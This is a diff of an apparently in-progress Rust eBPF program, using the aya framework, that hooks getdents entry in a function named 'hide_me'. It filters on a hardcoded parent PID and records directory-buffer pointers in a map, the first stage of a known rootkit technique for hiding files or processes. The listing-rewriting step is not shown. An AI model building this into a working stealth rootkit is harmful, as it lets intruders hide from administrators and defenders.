@@ -6,12 +6,13 @@ use core::mem::offset_of;
 use aya_ebpf::{
     helpers::{bpf_get_current_pid_tgid, bpf_get_current_task, bpf_probe_read_kernel},
     macros::{map, tracepoint},
+    maps::HashMap,
     maps::ProgramArray,
     programs::TracePointContext,
 };
 use aya_log_ebpf::info;
 
-use vmlinux::vmlinux::task_struct;
+use vmlinux::vmlinux::{linux_dirent64, task_struct};
 
 #[path = "./vmlinux/mod.rs"]
 mod vmlinux;
@@ -22,13 +23,13 @@ const trarget_ppid: i32 = 4309;
 
 #[map]
 static JUMP_TABLE: ProgramArray = ProgramArray::with_max_entries(2, 0);
+#[allow(non_upper_case_globals)]
+#[map]
+static map_buffs: HashMap<u64, u64> = HashMap::<u64, u64>::with_max_entries(8192, 0);
 
 #[tracepoint]
 pub fn hide_me(ctx: TracePointContext) -> u32 {
-    match handle_getdents_enter(ctx) {
-        Ok(ret) => ret,
-        Err(ret) => ret,
-    }
+    handle_getdents_enter(ctx).unwrap_or_else(|ret| ret)
 }
 
 fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
@@ -45,7 +46,7 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
             bpf_probe_read_kernel::<i32>(
                 (real_parent.unwrap() as usize + offset_of!(task_struct, tgid)) as *const i32,
             )
-            .unwrap()
+                .unwrap()
         };
 
         if ppid != trarget_ppid {
@@ -53,14 +54,18 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
         }
     }
 
-    let pid = pid_tgid >> 32;
-    unsafe {
-        let fd: u32 = ctx.read_at(16).unwrap();
-        let buff_count: u32 = ctx.read_at(32).unwrap();
-    }
 
-    // let dirp:  = unsafe { ctx.read_at(24).unwrap() };
+    // let pid = pid_tgid >> 32;
+    // field:unsigned int fd;  offset:16;      size:8; signed:0;
+    // field:struct linux_dirent64 * dirent;   offset:24;      size:8; signed:0;
+    // field:unsigned int count;       offset:32;      size:8; signed:0;
+    // let fd: u32 = unsafe { ctx.read_at(16).unwrap() };
+    // let buff_count: u32 = unsafe { ctx.read_at(32).unwrap() };
+    // info!(&ctx, "pid is {}, fd is {}, buff_count is {}", pid, fd, buff_count);
 
+
+    let dirp: *const linux_dirent64 = unsafe { ctx.read_at(24).unwrap() };
+    map_buffs.insert(&pid_tgid, &(dirp as u64), 0).unwrap();
     Ok(0)
 }
 
